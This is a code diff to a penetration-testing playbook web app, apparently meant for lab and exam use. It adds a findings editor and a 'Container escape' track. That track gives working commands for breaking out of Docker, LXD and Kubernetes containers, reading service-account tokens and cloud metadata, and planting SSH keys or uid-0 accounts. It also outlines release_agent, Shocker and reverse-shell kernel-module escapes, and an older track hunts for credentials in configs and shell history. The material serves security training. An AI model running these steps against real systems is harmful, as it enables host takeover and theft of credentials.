@@ -350,6 +350,43 @@ body.overlay-open{overflow:hidden}
 .atbl .res-ruled{color:#f43f5e}
 .atbl .res-worked{color:#34d399}
 
+/* ---------- findings (block editor) ---------- */
+.fnd-head{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin:2px 0 14px}
+.fnd-head .count{font-family:var(--mono);font-size:12px;color:var(--muted)}
+.fnd-head .sev-tally{display:flex;gap:6px;flex-wrap:wrap}
+.sev-chip{font-family:var(--mono);font-size:10.5px;border-radius:999px;padding:2px 9px;
+  border:1px solid var(--line);color:var(--muted);white-space:nowrap}
+.sev-chip b{color:var(--ink)}
+.fnd-list{display:flex;flex-direction:column;gap:10px}
+.fnd{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--sc,var(--faint));
+  border-radius:10px;padding:12px 14px 12px 12px;display:flex;gap:10px;align-items:flex-start}
+.fnd.dragging{opacity:.45}
+.fnd.over{border-top:2px solid var(--accent)}
+.fnd .grip{flex:none;cursor:grab;color:var(--faint);font-size:15px;line-height:1.2;padding:2px 2px 0;user-select:none}
+.fnd .grip:active{cursor:grabbing}
+.fnd .body{flex:1;min-width:0;display:flex;flex-direction:column;gap:7px}
+.fnd .row1{display:flex;gap:9px;align-items:center;flex-wrap:wrap}
+.fnd .title{flex:1;min-width:140px;background:transparent;border:0;outline:0;color:var(--ink);
+  font-family:var(--sans);font-size:15px;font-weight:600;padding:2px 0}
+.fnd .title::placeholder{color:var(--faint);font-weight:400}
+.fnd select{font-family:var(--mono);font-size:11px;border-radius:6px;padding:3px 6px;cursor:pointer;
+  background:var(--elev);border:1px solid var(--line);color:var(--ink);outline:0}
+.fnd select.sev{color:#0b0f14;font-weight:600;border:0}
+.fnd select:focus{border-color:var(--accent)}
+.fnd .affected{background:transparent;border:0;border-bottom:1px dashed var(--line);outline:0;
+  color:var(--muted);font-family:var(--mono);font-size:12px;padding:2px 0;width:100%}
+.fnd .affected:focus{border-bottom-color:var(--accent);color:var(--ink)}
+.fnd .affected::placeholder{color:var(--faint)}
+.fnd .desc{width:100%;background:transparent;border:0;outline:0;resize:none;overflow:hidden;
+  color:var(--ink);font-family:var(--sans);font-size:13px;line-height:1.55;padding:0;min-height:20px}
+.fnd .desc::placeholder{color:var(--faint)}
+.fnd .del{flex:none;background:none;border:0;color:var(--faint);cursor:pointer;font-family:var(--mono);
+  font-size:14px;line-height:1;padding:2px 4px;border-radius:5px}
+.fnd .del:hover{color:#f43f5e;background:var(--elev)}
+.fnd-add{margin-top:12px}
+.fnd-empty{background:var(--surface);border:1px dashed var(--line);border-radius:10px;padding:18px 18px;color:var(--muted);font-size:13px}
+.fnd-empty b{color:var(--ink);font-family:var(--mono);font-size:13px}
+
 /* ---------- dynamic stuck panel ---------- */
 .stuck-live{padding:0 16px 4px}
 .stuck-live .cue{display:flex;gap:9px;align-items:baseline;margin:0 0 8px;font-size:12.5px;color:var(--muted)}
@@ -513,7 +550,8 @@ body.overlay-open{overflow:hidden}
 
 <script>
 const COL={recon:"#38bdf8",web:"#2dd4bf",linux:"#f59e0b",windows:"#60a5fa",
-           ad:"#c084fc",pivot:"#f472b6",bof:"#fb7185",pw:"#a3e635",av:"#94a3b8"};
+           ad:"#c084fc",pivot:"#f472b6",bof:"#fb7185",pw:"#a3e635",av:"#94a3b8",
+           container:"#22d3ee"};
 
 const TRACKS=[
 /* ============================ RECON ============================ */
@@ -644,8 +682,9 @@ const TRACKS=[
    {d:"Run the enum script, then actually read it",c:"./linpeas.sh | tee loot/linpeas.txt",l:"The red and yellow highlights are the point. Do not scroll past them."},
    {d:"SUID binaries and capabilities",c:"find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null",l:"Both map straight to GTFOBins entries."},
    {d:"Cron jobs and writable scripts",c:"cat /etc/crontab; ls -la /etc/cron*",l:"A root cron running a writable script is game over."},
-   {d:"Hunt for creds in configs, history and web roots",c:"cat ~/.bash_history; grep -riE 'password|passwd|secret' /var/www /etc 2>/dev/null",l:"Reused passwords escalate more boxes than any exploit."}
- ]},
+   {d:"Hunt for creds in configs, history and web roots",c:"cat ~/.bash_history; grep -riE 'password|passwd|secret' /var/www /etc 2>/dev/null",l:"Reused passwords escalate more boxes than any exploit."},
+   {d:"Check whether this shell is inside a container",c:"ls -la /.dockerenv /run/.containerenv 2>/dev/null; grep -qiE 'docker|lxc|kubepods' /proc/1/cgroup && echo CONTAINED",l:"If either fires, the path to root is a break-out, not ordinary privesc — switch to the <b>Container escape</b> track."}
+ ],branch:["<code>/.dockerenv</code>, <code>/run/.containerenv</code> or docker/lxc/kubepods in /proc/1/cgroup → Container escape track"]},
  {n:3,title:"Escalate to root",tag:"privesc",goal:"user \u2192 root",steps:[
    {d:"Abuse sudo / SUID / capabilities via GTFOBins",c:"# e.g. sudo /usr/bin/find . -exec /bin/sh \\; -quit",l:"Look up the exact binary on GTFOBins for the copy-paste line."},
    {d:"Writable /etc/passwd or PATH hijack on a root process",c:"openssl passwd -1 -salt x pass   # add a uid-0 line if /etc/passwd is writable",l:"Common on soft boxes. PATH hijack works when a root script calls a binary by name."},
@@ -740,6 +779,73 @@ const TRACKS=[
    {d:"Send tools through SOCKS",c:"proxychains -q nxc smb 10.10.20.0/24    # /etc/proxychains4.conf: socks5 127.0.0.1 1080",l:"Some tools dislike proxychains (raw sockets). Use a port-forward for those, or ligolo."},
    {d:"Then re-run recon against the new range",c:"proxychains -q nmap -sT -Pn -p- --min-rate 2000 10.10.20.10",l:"Use -sT connect scans through a SOCKS proxy, not SYN."}
  ],tips:["Note which host each tunnel runs through. When a session drops you need to know what you lost."]}
+]},
+
+/* ============================ CONTAINER ESCAPE ============================ */
+{id:"container",name:"Container escape",colour:COL.container,
+ blurb:"You have a shell, but it is inside a container. Work out how it is confined, then break out to the host.",
+ phases:[
+ {n:1,title:"Am I in a container?",tag:"recon",goal:"Confirm containment and which runtime",steps:[
+   {d:"The give-away files",c:"ls -la /.dockerenv /run/.containerenv 2>/dev/null",
+    l:"<code>/.dockerenv</code> is Docker; <code>/run/.containerenv</code> is Podman. Their absence does not rule a container out."},
+   {d:"cgroup and PID 1 name the runtime",c:"cat /proc/1/cgroup; head -1 /proc/1/sched 2>/dev/null",
+    l:"<code>docker</code>, <code>lxc</code> or <code>kubepods</code> in the cgroup path, or a PID 1 that is not systemd/init, both point at a container."},
+   {d:"Kubernetes leaves a token and env behind",c:"env | grep -i KUBERNETES; ls /run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null",
+    l:"A mounted service-account token means you are in a pod \u2014 go to the Kubernetes phase."}
+ ],tips:["Few processes, a short hex hostname and a tiny package set are soft tells.","Knowing the runtime (Docker, Podman, LXC, containerd, CRI-O) decides which escape applies."]},
+ {n:2,title:"Enumerate the confinement",tag:"recon",goal:"Capabilities, devices, mounts and sockets \u2014 the escape is almost always one of these",steps:[
+   {d:"Effective capabilities (the single most important check)",c:"capsh --print 2>/dev/null; grep Cap /proc/self/status",
+    l:"Decode a hex value with <code>capsh --decode=&lt;hex&gt;</code>. <b>CAP_SYS_ADMIN</b>, <b>CAP_SYS_PTRACE</b>, <b>CAP_DAC_READ_SEARCH</b> and <b>CAP_SYS_MODULE</b> each have a known break-out."},
+   {d:"Am I a privileged container?",c:"ls /dev | wc -l; fdisk -l 2>/dev/null",
+    l:"A <code>--privileged</code> container sees the host block devices \u2014 dozens of /dev entries and fdisk listing the host disks. That alone is a full escape (next phase)."},
+   {d:"Exposed Docker socket \u2014 instant game over",c:"ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null",
+    l:"A mounted <code>docker.sock</code> lets you start a privileged container on the host. See the Docker socket phase."},
+   {d:"Host paths mounted into the container",c:"mount; grep -vE 'proc|sysfs|cgroup|tmpfs|overlay|mqueue|shm' /proc/mounts",
+    l:"A host directory mounted in \u2014 especially read-write, or the whole <code>/</code> \u2014 is a direct write path to the host (cron, SSH keys, /etc/passwd)."},
+   {d:"Shared namespaces and host processes",c:"ls -la /proc/1/ns/; ps aux | head",
+    l:"Seeing host processes in <code>ps</code> means <code>--pid=host</code>; with CAP_SYS_PTRACE you can inject into one of them."}
+ ],tips:["<b>deepce</b> and <b>CDK</b> automate all of this: <code>./deepce.sh</code> or <code>cdk evaluate --full</code>.","Record every capability and every mount before trying anything \u2014 the escape is usually already visible here."]},
+ {n:3,title:"Docker socket / daemon",tag:"privesc",goal:"Abuse an exposed docker.sock or docker-group membership",steps:[
+   {d:"Docker client present: mount the host root and chroot in",c:"docker run -v /:/host -it alpine chroot /host bash",
+    l:"You are now root on the host filesystem. If no image is cached, reuse one that is (<code>docker images</code>)."},
+   {d:"No client? Drive the socket with curl",c:"curl -s --unix-socket /var/run/docker.sock http://localhost/images/json",
+    l:"Confirms access; then create a container that binds <code>/</code> via the API and start it. CDK automates this end to end."},
+   {d:"Membership of the docker group is the same thing",c:"id; docker run -v /:/host -it alpine chroot /host sh",
+    l:"Being in the <code>docker</code> group (check <code>id</code>) is root-equivalent on the host \u2014 container or not."}
+ ],branch:["Root on the host filesystem \u2192 After the escape"]},
+ {n:4,title:"Privileged / capability escapes",tag:"privesc",goal:"Turn --privileged or a dangerous capability into host code execution",steps:[
+   {d:"Privileged: mount the host disk directly",c:"fdisk -l; mkdir -p /mnt/host; mount /dev/sda1 /mnt/host && chroot /mnt/host bash",
+    l:"Pick the host root partition from <code>fdisk -l</code>. Then read /etc/shadow, drop an SSH key, or add a root cron."},
+   {d:"CAP_SYS_ADMIN (+ permissive AppArmor): cgroup release_agent",c:"# mount -t cgroup -o rdma cgroup /tmp/cg; point release_agent at a script on a host-visible path; empty a cgroup to trigger it",
+    l:"The classic notify_on_release / release_agent break-out \u2014 runs your payload as root on the host. HackTricks has the exact script."},
+   {d:"CAP_DAC_READ_SEARCH: Shocker reads host files by inode",c:"# open_by_handle_at brute force (shocker.c) to read /etc/shadow from the host with no mount",
+    l:"Reads arbitrary host files even without a mount; with DAC_OVERRIDE you can write them too."},
+   {d:"CAP_SYS_PTRACE + --pid=host: inject into a host process",c:"# attach a shellcode injector to a host PID (e.g. PID 1)",
+    l:"Shared host PID namespace plus ptrace is code execution in a host process's context."},
+   {d:"CAP_SYS_MODULE: load a kernel module",c:"# build a .ko whose init fires a reverse shell, then insmod it",
+    l:"Loading a module runs code in the kernel \u2014 total host compromise. Rare, but decisive."}
+ ],branch:["Root on the host \u2192 After the escape"],
+  tips:["<b>--privileged or CAP_SYS_ADMIN is the usual lab/CTF path.</b> Check AppArmor and Seccomp first; the release_agent trick needs them off or permissive.","<b>CVE-2019-5736 (runc):</b> overwrite the host <code>runc</code> from inside the container, triggered the next time an admin <code>docker exec</code>s in."]},
+ {n:5,title:"LXC / LXD group",tag:"privesc",goal:"Abuse lxd/lxc group membership (a classic lab escalation)",steps:[
+   {d:"Membership of the lxd/lxc group is root on the host",c:"id | grep -E 'lxd|lxc'",
+    l:"No exploit needed \u2014 the group lets you start a privileged container that mounts the host filesystem."},
+   {d:"Import a tiny image, run a privileged container mounting /",c:"lxc image import ./alpine.tar.gz --alias esc; lxc init esc r -c security.privileged=true; lxc config device add r host disk source=/ path=/mnt/root recursive=true; lxc start r; lxc exec r sh",
+    l:"Inside, the host filesystem is at <code>/mnt/root</code>. Build the image with <code>lxd-alpine-builder</code> (or <code>distrobuilder</code>) if none is present."}
+ ],branch:["On the host filesystem \u2192 After the escape"]},
+ {n:6,title:"Kubernetes",tag:"privesc",goal:"From a pod to the node, or the whole cluster",steps:[
+   {d:"Grab the service-account token and see what it can do",c:"cat /run/secrets/kubernetes.io/serviceaccount/token; kubectl auth can-i --list",
+    l:"The token authenticates you to the API. <code>can-i --list</code> shows your rights \u2014 create pods is usually enough."},
+   {d:"If you can create pods, schedule a privileged one that mounts the node",c:"# kubectl apply a pod with hostPID:true, privileged:true and hostPath source: / , then exec in and chroot /host",
+    l:"A pod binding the node's <code>/</code> gives root on that node. HackTricks has a ready manifest."},
+   {d:"Hit the kubelet and the cloud metadata service",c:"curl -sk https://localhost:10250/pods; curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null",
+    l:"A read/write kubelet API runs commands in pods. Cloud metadata can hand over node credentials."}
+ ],tips:["<code>kubectl</code> is often absent \u2014 call the API with curl and the token as a <code>Bearer</code> header.","Once on the node, look for other pods' mounted secrets and tokens."]},
+ {n:7,title:"After the escape",tag:"post-exploit",goal:"Confirm you are on the host, then prove it",steps:[
+   {d:"Confirm you left the container",c:"hostname; id; head -1 /etc/shadow; ls /root",
+    l:"A different hostname, the host's shadow file and the host's /root all confirm you are out."},
+   {d:"Get a real foothold rather than living in a mount",c:"# add an SSH key to /root/.ssh/authorized_keys, or add a uid-0 line to the host /etc/passwd",
+    l:"A chroot over a mount is fragile \u2014 establish proper host access before doing anything else, and screenshot proof with context."}
+ ]}
 ]},
 
 /* ============================ BUFFER OVERFLOW ============================ */
@@ -851,14 +957,14 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.1.0";
+const APP_VERSION="1.2.0";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
 // the lot. Swallowing that silently is the worst outcome during a timed exam:
 // the first failed write raises a banner instead, and every successful one
 // flashes the save indicator so you can see the tool is keeping up.
-const STORE_PREFIXES=["playbook2:","notes2:","timer2:","scan2:","scantext:","evidence2:","attempts:","view2:"];
+const STORE_PREFIXES=["playbook2:","notes2:","timer2:","scan2:","scantext:","evidence2:","attempts:","findings:","view2:"];
 const store={
   broken:false,
   get(k,d){try{const v=localStorage.getItem(k);return v===null?(d===undefined?null:d):v;}catch(_){this.fail();return d===undefined?null:d;}},
@@ -945,6 +1051,7 @@ function boxState(name){
   return {progress:store.json("playbook2:"+name,{}),notes:store.json("notes2:"+name,{}),
     evidence:store.json("evidence2:"+name,{}),attempts:store.json("attempts:"+name,[]),
     scan:store.json("scan2:"+name,[]),scanText:store.get("scantext:"+name,""),
+    findings:store.json("findings:"+name,[]),
     timer:store.get("timer2:"+name,"")};
 }
 function writeBoxState(name,st){
@@ -952,12 +1059,13 @@ function writeBoxState(name,st){
   if(st.notes)store.setJson("notes2:"+name,st.notes);
   if(st.evidence)store.setJson("evidence2:"+name,st.evidence);
   if(st.attempts)store.setJson("attempts:"+name,st.attempts);
+  if(st.findings)store.setJson("findings:"+name,st.findings);
   if(st.scan)store.setJson("scan2:"+name,st.scan);
   if(st.scanText)store.set("scantext:"+name,st.scanText);
   if(st.timer)store.set("timer2:"+name,st.timer);
 }
 function reloadBoxState(){
-  progress=loadProg();reloadNotes();reloadTimer();loadEvidence();loadAttempts();
+  progress=loadProg();reloadNotes();reloadTimer();loadEvidence();loadAttempts();loadFindings();
 }
 function switchBox(name){
   VARS.BOX=name||"";
@@ -1626,6 +1734,111 @@ function renderProof(){
   refreshTokens();applyProg();
 }
 
+// --- findings (block editor) ---
+// A structured, report-grade place to record findings, separate from the
+// free-text notes. Each one flows into the write-up's Findings section, and
+// travels with the box on export.
+const SEV_ORDER=["critical","high","medium","low","info"];
+const SEV_COL={critical:"#f43f5e",high:"#fb923c",medium:"#fbbf24",low:"#60a5fa",info:"#94a3b8"};
+const FND_STATUS=["open","confirmed","reported","remediated"];
+let findings=[];
+function findingsKey(){return "findings:"+boxId();}
+function loadFindings(){const v=store.json(findingsKey(),[]);findings=Array.isArray(v)?v:[];}
+function saveFindings(){store.setJson(findingsKey(),findings);rememberBox();}
+function sevRank(sv){const i=SEV_ORDER.indexOf(sv);return i<0?SEV_ORDER.length:i;}
+function newFindingId(){return "f"+Date.now().toString(36)+Math.random().toString(36).slice(2,6);}
+
+function renderFindings(){
+  openOverlay("Findings","__findings","#fb923c");
+  const head=document.createElement("div");head.className="fnd-head";host.appendChild(head);
+  const list=document.createElement("div");list.className="fnd-list";host.appendChild(list);
+  const addBtn=document.createElement("button");addBtn.className="genbtn fnd-add";addBtn.type="button";
+  addBtn.textContent="+ new finding";
+  addBtn.onclick=()=>{findings.push({id:newFindingId(),title:"",severity:"medium",status:"open",affected:"",desc:""});
+    saveFindings();draw();const t=list.querySelector(".fnd:last-child .title");if(t)t.focus();};
+  host.appendChild(addBtn);
+
+  const grow=ta=>{ta.style.height="auto";ta.style.height=ta.scrollHeight+"px";};
+
+  function draw(){
+    head.innerHTML="";
+    const c=document.createElement("span");c.className="count";
+    c.textContent=findings.length?(findings.length+" finding"+(findings.length>1?"s":"")):"no findings yet";
+    head.appendChild(c);
+    const tally=document.createElement("div");tally.className="sev-tally";
+    SEV_ORDER.forEach(sv=>{const n=findings.filter(f=>f.severity===sv).length;if(!n)return;
+      const ch=document.createElement("span");ch.className="sev-chip";
+      ch.style.borderColor="color-mix(in srgb,"+SEV_COL[sv]+" 50%,var(--line))";
+      ch.innerHTML='<b style="color:'+SEV_COL[sv]+'">'+n+'</b> '+sv;tally.appendChild(ch);});
+    head.appendChild(tally);
+
+    list.innerHTML="";
+    if(!findings.length){
+      const e=document.createElement("div");e.className="fnd-empty";
+      e.innerHTML="<b>Nothing logged yet.</b><br>Add a finding as you confirm one \u2014 a title, how bad it is, where it lives, and what it is. They sort by severity in the write-up's Findings section and travel with the box when you export it.";
+      list.appendChild(e);return;
+    }
+    findings.forEach((f,i)=>{
+      const card=document.createElement("div");card.className="fnd";card.dataset.i=i;
+      card.style.setProperty("--sc",SEV_COL[f.severity]||"var(--faint)");
+
+      const grip=document.createElement("div");grip.className="grip";grip.textContent="\u2630";
+      grip.title="Drag to reorder";grip.setAttribute("aria-hidden","true");
+      // only the handle starts a drag, so text selection in the fields still works
+      grip.addEventListener("mousedown",()=>{card.draggable=true;});
+      card.appendChild(grip);
+
+      const body=document.createElement("div");body.className="body";
+      const row1=document.createElement("div");row1.className="row1";
+
+      const title=document.createElement("input");title.className="title";title.value=f.title||"";
+      title.placeholder="Untitled finding";title.setAttribute("aria-label","Finding title");
+      title.oninput=()=>{f.title=title.value;saveFindings();};
+
+      const sev=document.createElement("select");sev.className="sev";sev.setAttribute("aria-label","Severity");
+      SEV_ORDER.forEach(o=>{const op=document.createElement("option");op.value=o;op.textContent=o;sev.appendChild(op);});
+      sev.value=f.severity;sev.style.background=SEV_COL[f.severity];
+      sev.onchange=()=>{f.severity=sev.value;saveFindings();draw();};
+
+      const st=document.createElement("select");st.setAttribute("aria-label","Status");
+      FND_STATUS.forEach(o=>{const op=document.createElement("option");op.value=o;op.textContent=o;st.appendChild(op);});
+      st.value=FND_STATUS.includes(f.status)?f.status:"open";
+      st.onchange=()=>{f.status=st.value;saveFindings();};
+
+      const del=document.createElement("button");del.className="del";del.type="button";del.textContent="\u00d7";
+      del.title="Delete this finding";del.setAttribute("aria-label","Delete finding");
+      del.onclick=()=>{if((f.title||f.desc)&&!confirm("Delete \""+(f.title||"this finding")+"\"?"))return;
+        findings.splice(i,1);saveFindings();draw();};
+
+      row1.appendChild(title);row1.appendChild(sev);row1.appendChild(st);row1.appendChild(del);
+
+      const affected=document.createElement("input");affected.className="affected";affected.value=f.affected||"";
+      affected.placeholder="affected host / port / URL / parameter";affected.setAttribute("aria-label","Affected target");
+      affected.oninput=()=>{f.affected=affected.value;saveFindings();};
+
+      const desc=document.createElement("textarea");desc.className="desc";desc.value=f.desc||"";
+      desc.placeholder="What it is, how you found it, and the impact. This becomes the finding's write-up entry.";
+      desc.setAttribute("aria-label","Finding description");
+      desc.oninput=()=>{f.desc=desc.value;grow(desc);saveFindings();};
+
+      body.appendChild(row1);body.appendChild(affected);body.appendChild(desc);
+      card.appendChild(body);list.appendChild(card);grow(desc);
+
+      card.addEventListener("dragstart",e=>{card.classList.add("dragging");
+        e.dataTransfer.effectAllowed="move";e.dataTransfer.setData("text/plain",String(i));});
+      card.addEventListener("dragend",()=>{card.draggable=false;card.classList.remove("dragging");
+        list.querySelectorAll(".fnd").forEach(x=>x.classList.remove("over"));});
+      card.addEventListener("dragover",e=>{e.preventDefault();card.classList.add("over");});
+      card.addEventListener("dragleave",()=>card.classList.remove("over"));
+      card.addEventListener("drop",e=>{e.preventDefault();
+        const from=+e.dataTransfer.getData("text/plain");
+        if(isNaN(from)||from===i)return;
+        const moved=findings.splice(from,1)[0];findings.splice(i,0,moved);saveFindings();draw();});
+    });
+  }
+  draw();
+}
+
 // --- notes & credentials drawer ---
 function notesKey(){return "notes2:"+(VARS.BOX||"_default");}
 function loadNotes(){return store.json(notesKey(),{})||{};}
@@ -2144,6 +2357,18 @@ function buildWriteupModel(mode){
   m.push({t:"p",x:exam
     ? "This section should state, in one short paragraph, how initial access was obtained on "+box+(ip?" ("+ip+")":"")+" and how privileges were escalated. The full command-by-command walkthrough follows under Exploitation path."
     : "This report documents the assessment of "+box+(ip?" ("+ip+")":"")+". Open services are listed under Enumeration, and the steps taken to gain and escalate access are documented under Exploitation path with supporting evidence. Replace this paragraph with a short account of the outcome in your own words."});
+  const fnd=findings.filter(f=>f.title||f.desc);
+  if(fnd.length){
+    m.push({t:"h2",x:"Findings"});
+    const sorted=[...fnd].sort((a,b)=>sevRank(a.severity)-sevRank(b.severity));
+    m.push({t:"table",head:["Finding","Severity","Status","Affected"],
+      rows:sorted.map(f=>[f.title||"(untitled)",(f.severity||"").toUpperCase(),f.status||"",f.affected||"\u2014"])});
+    sorted.forEach(f=>{
+      m.push({t:"h3",x:(f.title||"(untitled)")+" \u2014 "+(f.severity||"").toUpperCase()});
+      if(f.affected)m.push({t:"p",x:"**Affected:** "+f.affected});
+      if(f.desc)m.push({t:"p",x:f.desc});
+    });
+  }
   m.push({t:"h2",x:"Enumeration"});
   if(ports.length)m.push({t:"table",head:["Port","Service","Version"],rows:ports.map(p=>[p.port+"/"+p.proto,p.service||"",p.version||""])});
   else m.push({t:"p",x:"No scan captured. Paste an nmap scan into the Scan planner to populate this section."});
@@ -2325,6 +2550,7 @@ function renderOverview(){
   stats.appendChild(stat("evidence",tick?ev+" / "+tick+" ticked":"\u2014"));
   const ruled=attempts.filter(a=>a.what&&a.result==="ruled out").length;
   if(attempts.length)stats.appendChild(stat("ruled out",String(ruled)));
+  if(findings.length)stats.appendChild(stat("findings",String(findings.length)));
   host.appendChild(stats);
 
   if(ports.length){
@@ -2361,6 +2587,7 @@ const TOOLS=[
   {id:"hashes",  pill:"__hashes",  label:"Hashes",    colour:"#a3e635", fn:()=>renderHashes()},
   {id:"proof",   pill:"__proof",   label:"Proof",     colour:"#fbbf24", fn:()=>renderProof()},
   {id:"exploits",pill:"__exploits",label:"Exploits",  colour:"#f43f5e", fn:()=>renderExploits()},
+  {id:"findings", pill:"__findings", label:"Findings", colour:"#fb923c", fn:()=>renderFindings()},
   {id:"writeup", pill:"__writeup", label:"Write-up",  colour:"#5aa2ff", fn:()=>renderWriteup()}
 ];
 
@@ -2745,6 +2972,7 @@ reloadNotes();
 reloadTimer();
 loadEvidence();
 loadAttempts();
+loadFindings();
 renderBoxPicker();
 publishVars();
 document.getElementById("drawer").addEventListener("toggle",e=>{if(e.target.open)renderStuckLive();});
